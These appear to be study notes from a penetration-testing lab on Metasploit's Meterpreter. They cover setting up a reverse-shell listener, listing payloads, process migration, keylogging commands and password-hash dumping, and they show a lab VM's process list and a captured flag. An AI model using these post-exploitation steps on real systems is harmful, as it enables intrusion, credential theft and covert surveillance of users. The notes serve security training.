##### Basics
The Meterpreter is a Metasploit agent, staying well out of sight of the target, and establishing encrypted TLS connection to the attacker.
Meterpreter will be detected by major antivirus software, but is still very stealthy.
Because the Meterpreter runs on the RAM, it will be gone by the time the device has rebooted.
Meterpreter will connect to a running MSFConsole session.

##### Listening
To listen for a reverse shell, use (in MSFConsole):
```
use exploit/multi/handler
set PAYLOAD USED_PAYLOAD 
set LHOST IP
set LPORT PORT
set ExitOnSession false
exploit -j
```

##### Payloads
There are many payloads available, for a lot of different platforms. To list them, use 
```
msfvenom --list payloads | grep meterpreter
```

When you decide the payload, use these factors:
- The operating system of the target
- Available components on the target's system (Python, PHP, etc)
- Allowed network connection types

##### Commands
Run `help` to get a list with description of all commands.

Important commands:
```
background       // Background the current session.
sessions         // View and switch between sessions.
run              // Execute a Meterpreter script or module.
upload/download  // Uploads/downloads content to or from the target machine.
shell            // Drops into a system shell on the target.
hashdump         // Dums the contents of the SAMM database.
getuid           // Check user privilege.
search           // Search for file on target system.
show options     // View all info
```


###### Migration
Process migration will help you interact, stabilize and record keystrokes on a program.
Usage: `migrate PID`
Logging keys: `keyscan_start`, `keyscan_stop`, `keyscan_dump`
Note: This will change the user privilege level, which you might not be able to gain back.

Usage:
```
(Meterpreter 5)(C:\Users\luiza) > ps                                                                                   
                                                                                                                                                                                                                                               
Process List                                                                                                           
============                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                               
 PID   PPID  Name                         Arch  Session  User                          Path                           
 ---   ----  ----                         ----  -------  ----                          ----                           
 0     0     [System Process]                                                                                          
 4     0     System                       x64   0                                                                      
 100   4     Registry                     x64   0                                                                      
 368   4     smss.exe                     x64   0                                                                                                                                                                                              
 392   5884  msedgewebview2.exe           x64   1        ITWK01\offsec                 C:\Program Files (x86)\Microsoft\EdgeWebView\Application\105.0.1343.27\msedgewebview2.exe                                                               
 428   652   dwm.exe                      x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe    
 460   448   csrss.exe                    x64   0                                                                                                                                                                                              
 556   448   wininit.exe                  x64   0                                                                                                                                                                                              
 572   548   csrss.exe                    x64   1                                                                                                                                                                                              
 620   668   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe                                                                                                                         
 652   548   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe                                                         
 664   668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe                                                                                                                         
 668   556   services.exe                 x64   0                                                                                                                                                                                              
 700   556   lsass.exe                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe  
 728   668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 812   668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 820   652   fontdrvhost.exe              x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe              
 828   556   fontdrvhost.exe              x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 872   668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 924   668   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 992   668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1140  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1148  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1236  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1248  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1276  668   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1328  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1376  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1432  668   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1504  668   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1588  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1632  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1660  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1688  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1720  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1728  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1748  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2960  668   vm3dservice.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe                                                                                                            
 2972  668   vmtoolsd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                                                                                                       
 3000  668   MsMpEng.exe                  x64   0                                                                                                                                                                                              
 3012  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 
 3016  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 3024  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 3100  392   msedgewebview2.exe           x64   1        ITWK01\offsec                 C:\Program Files (x86)\Microsoft\EdgeWebView\Application\105.0.1343.27\msedgewebview2.exe                                                               
 3172  2960  vm3dservice.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe                                                                                                                     
 3500  2792  AggregatorHost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\AggregatorHost.exe                                                                                                                  
 3548  668   dllhost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe                                                                                                                         
 3716  668   SearchIndexer.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe                                                                                                                   
 3724  5384  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe                                                                                           
 3732  812   WmiPrvSE.exe                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe                                                                                                                   
 3844  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 3988  668   msdtc.exe                    x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe                                                                                                                           
 4020  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe 
 4060  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 
 4128  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 4168  1988  taskhostw.exe                x64   1        ITWK01\offsec                 C:\Windows\System32\taskhostw.exe                                                                                                                       
 4208  1988  MicrosoftEdgeUpdate.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe                                                                                     
 4220  668   svchost.exe                  x64   0                                                                      
 4236  812   PhoneExperienceHost.exe      x64   1        ITWK01\offsec                 C:\Program Files\WindowsApps\Microsoft.YourPhone_1.22062.543.0_x64__8wekyb3d8bbwe\PhoneExperienceHost.exe                                               
 4396  5384  vmtoolsd.exe                 x64   1        ITWK01\offsec                 C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                                                                                                       
 4408  2960  vm3dservice.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe                                                                                                                     
 4460  668   svchost.exe                  x64   0                                                                      
 4572  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 
 4672  1988  access.exe                   x64   0        ITWK01\luiza                  C:\Users\luiza\access.exe       
 4840  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe 
 4860  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 
 5036  2592  sihost.exe                   x64   1        ITWK01\offsec                 C:\Windows\System32\sihost.exe  
 5048  668   svchost.exe                  x64   1        ITWK01\offsec                 C:\Windows\System32\svchost.exe                                                                                                                         
 5088  668   svchost.exe                  x64   1        ITWK01\offsec                 C:\Windows\System32\svchost.exe 
 5108  668   TrustedInstaller.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe                                                                                                               
 5152  668   svchost.exe                  x64   0                                                                      
 5168  3844  ctfmon.exe                   x64   1        ITWK01\offsec                 C:\Windows\System32\ctfmon.exe                                                                                                                          
 5176  812   RuntimeBroker.exe            x64   1        ITWK01\offsec                 C:\Windows\System32\RuntimeBroker.exe                                                                                                                   
 5272  668   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 5384  5340  explorer.exe                 x64   1        ITWK01\offsec                 C:\Windows\explorer.exe        
 5552  668   svchost.exe                  x64   1        ITWK01\offsec                 C:\Windows\System32\svchost.exe 
 5564  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 
 5600  668   svchost.exe                  x64   1        ITWK01\offsec                 C:\Windows\System32\svchost.exe 
 5728  812   RuntimeBroker.exe            x64   1        ITWK01\offsec                 C:\Windows\System32\RuntimeBroker.exe                                                                                                                   
 5884  812   Widgets.exe                  x64   1        ITWK01\offsec                 C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_421.20070.625.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe                             
 5936  812   dllhost.exe                  x64   1        ITWK01\offsec                 C:\Windows\System32\dllhost.exe
 6048  812   SearchHost.exe               x64   1        ITWK01\offsec                 C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe                                                                          
 6056  812   StartMenuExperienceHost.exe  x64   1        ITWK01\offsec                 C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe                                               
 6212  392   msedgewebview2.exe           x64   1        ITWK01\offsec                 C:\Program Files (x86)\Microsoft\EdgeWebView\Application\105.0.1343.27\msedgewebview2.exe                                                               
 6268  812   RuntimeBroker.exe            x64   1        ITWK01\offsec                 C:\Windows\System32\RuntimeBroker.exe                                                                                                                   
 6288  812   dllhost.exe                  x64   1        ITWK01\offsec                 C:\Windows\System32\dllhost.exe                                                                                                                         
 6348  812   ShellExperienceHost.exe      x64   1        ITWK01\offsec                 C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe                                                                         
 6636  812   TiWorker.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.22000.1035_none_82ad6282fedae350\TiWorker.exe                            
 6760  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 6852  668   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                                                                                                         
 6920  668   SecurityHealthService.exe    x64   0                                                                                                                                                                                              
 6924  5384  SecurityHealthSystray.exe    x64   1        ITWK01\offsec                 C:\Windows\System32\SecurityHealthSystray.exe    


// Note the "1". This means it's interactive, meaning we can migrate to it.
3724  5384  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe                                                                                           
//

(Meterpreter 5)(C:\Windows\system32) > getenv flag

Environment Variables
=====================

Variable  Value
--------  -----
flag      thisistheanswertothequestion

```
